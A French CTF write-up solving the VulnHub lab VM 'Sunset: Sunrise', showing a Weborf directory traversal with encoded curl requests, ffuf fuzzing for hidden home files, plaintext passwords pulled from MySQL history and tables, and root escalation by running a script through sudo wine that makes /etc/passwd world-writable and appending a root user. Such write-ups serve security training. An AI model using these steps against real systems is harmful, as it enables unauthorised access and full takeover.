---
title: "Solution du CTF Sunset: Sunrise de VulnHub"
tags: [CTF, VulnHub]
---

## Tequila Sunrise

La VM expose plusieurs services dont un serveur web WebOrf.

```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
80/tcp   open  http       nginx 1.14.2
3306/tcp open  mysql?
8080/tcp open  http-proxy Weborf (GNU/Linux)
```

Ce dernier est vulnérable à un directory traversal, faille assez classique sur les serveurs web méconnus.

[weborf 0.12.2 - Directory Traversal - Linux remote Exploit](https://www.exploit-db.com/exploits/14925)

Pas besoin d'exploit, cURL a le bon goût de ne pas retirer l'encodage du path lors des requêtes (avec la librairie `requests` pour Python il faudrait procéder à un double encodage) :

```console
$ curl "http://192.168.56.157:8080/%2e%2e/"
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html><head><title>Weborf</title></head><body><table><tr><td></td><td>Name</td><td>Size</td></tr><tr style="background-color: #DFDFDF;"><td>d</td><td><a href="../">../</a></td><td>-</td></tr>
<tr style="background-color: #DFDFDF;"><td>d</td><td><a href="backups/">backups/</a></td><td>-</td></tr>
<tr style="background-color: #DFDFDF;"><td>d</td><td><a href="cache/">cache/</a></td><td>-</td></tr>
<tr style="background-color: #DFDFDF;"><td>d</td><td><a href="lib/">lib/</a></td><td>-</td></tr>
<tr style="background-color: #DFDFDF;"><td>d</td><td><a href="local/">local/</a></td><td>-</td></tr>
<tr style="background-color: #DFDFDF;"><td>d</td><td><a href="lock/">lock/</a></td><td>-</td></tr>
<tr style="background-color: #DFDFDF;"><td>d</td><td><a href="log/">log/</a></td><td>-</td></tr>
<tr style="background-color: #DFDFDF;"><td>d</td><td><a href="mail/">mail/</a></td><td>-</td></tr>
<tr style="background-color: #DFDFDF;"><td>d</td><td><a href="opt/">opt/</a></td><td>-</td></tr>
<tr style="background-color: #DFDFDF;"><td>d</td><td><a href="run/">run/</a></td><td>-</td></tr>
<tr style="background-color: #DFDFDF;"><td>d</td><td><a href="spool/">spool/</a></td><td>-</td></tr>
<tr style="background-color: #DFDFDF;"><td>d</td><td><a href="tmp/">tmp/</a></td><td>-</td></tr>
<tr style="background-color: #DFDFDF;"><td>d</td><td><a href="www/">www/</a></td><td>-</td></tr>
```

Quand je regarde dans `/home` je trouve les utilisateurs `sunrise` et `weborf`.

À première vue, rien d'intéressant dans leurs dossiers, mais avoir exploré le reste sans être plus avancé je décide d'y rejeter un œil.

Il s'avère que _WebOrf_ ne liste pas les fichiers cachés (pas de `.bashrc`, `.profile` ou `.bash_history`).

Je vais utiliser une wordlist spécifique pour trouver ces fichiers :

```console
$ ffuf -u "http://192.168.56.157:8080/%2e%2e/%2e%2e/home/weborf/FUZZ" -w home_files.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.56.157:8080/%2e%2e/%2e%2e/home/weborf/FUZZ
 :: Wordlist         : FUZZ: home_files.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

.profile                [Status: 200, Size: 807, Words: 128, Lines: 28]
.gnupg                  [Status: 301, Size: 0, Words: 1, Lines: 1]
.bashrc                 [Status: 200, Size: 3526, Words: 487, Lines: 114]
.local                  [Status: 301, Size: 0, Words: 1, Lines: 1]
.mysql_history          [Status: 200, Size: 83, Words: 8, Lines: 3]
:: Progress: [31/31] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

L'historique mysql de `weborf` contient un mot de passe :

```sql
show databases;
ALTER USER 'weborf'@'localhost' IDENTIFIED BY 'iheartrainbows44';
```

Le mot de passe permet un accès SSH mais aussi l'accès au MySQL qui contient un autre mot de passe :

```
MariaDB [(none)]> select User, Password from mysql.user;
+---------+-------------------------------------------+
| User    | Password                                  |
+---------+-------------------------------------------+
| root    | *C7B6683EEB8FF8329D8390574FAA04DD04B87C58 |
| sunrise | thefutureissobrightigottawearshades       |
| weborf  | *A76018C6BB42E371FD7B71D2EC6447AE6E37DB28 |
+---------+-------------------------------------------+
3 rows in set (0.000 sec)
```

## Sex on the beach

On peut alors utiliser ces identifiants pour le compte sunrise qui peut lancer `wine` via sudo :

```console
sunrise@sunrise:/home/weborf$ sudo -l
Matching Defaults entries for sunrise on sunrise:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sunrise may run the following commands on sunrise:
    (root) /usr/bin/wine
```

Le CTF [C0m80]({% link _posts/2018-03-04-Solution-du-CTF-C0m80-de-VulnHub.md %}) m'avait permis de découvrir l'option `start /unix` permettant d'exécuter des commandes Linux depuis Wine.

Je peux donc réutiliser cette technique, mais attention : Wine lance les programmes à la mode Windows, donc en tache de fond.

Faute de pouvoir lancer un shell, pour arriver à mes fins je crée un script bash qui change les permissions de `/etc/passwd` et je l'exécute depuis Wine :

```console
sunrise@sunrise:~$ cat script.sh 
#!/bin/bash
chmod 777 /etc/passwd
sunrise@sunrise:~$ chmod 777 script.sh 
sunrise@sunrise:~$ sudo /usr/bin/wine start /unix script.sh
sunrise@sunrise:~$ ls -al /etc/passwd
-rwxrwxrwx 1 root root 2435 Dec  5  2019 /etc/passwd
sunrise@sunrise:~$ echo devloop:ueqwOCnSGdsuM:0:0::/root:/bin/sh >> /etc/passwd
sunrise@sunrise:~$ su devloop
Password: 
# cd /root
# ls
Desktop  Documents  Downloads  Groups  Logs  Manual  Music  Pictures  Public  Readme  root.txt  Templates  Users  Videos
# cat root.txt
            ^^                   @@@@@@@@@
       ^^       ^^            @@@@@@@@@@@@@@@
                            @@@@@@@@@@@@@@@@@@              ^^
                           @@@@@@@@@@@@@@@@@@@@
 ~~~~ ~~ ~~~~~ ~~~~~~~~ ~~ &&&&&&&&&&&&&&&&&&&& ~~~~~~~ ~~~~~~~~~~~ ~~~
 ~         ~~   ~  ~       ~~~~~~~~~~~~~~~~~~~~ ~       ~~     ~~ ~
   ~      ~~      ~~ ~~ ~~  ~~~~~~~~~~~~~ ~~~~  ~     ~~~    ~ ~~~  ~ ~~
   ~  ~~     ~         ~      ~~~~~~  ~~ ~~~       ~~ ~ ~~  ~~ ~
 ~  ~       ~ ~      ~           ~~ ~~~~~~  ~      ~~  ~             ~~
       ~             ~        ~      ~      ~~   ~             ~

Thanks for playing! - Felipe Winsnes (@whitecr0wz)

24edb59d21c273c033aa6f1689b0b18c
```
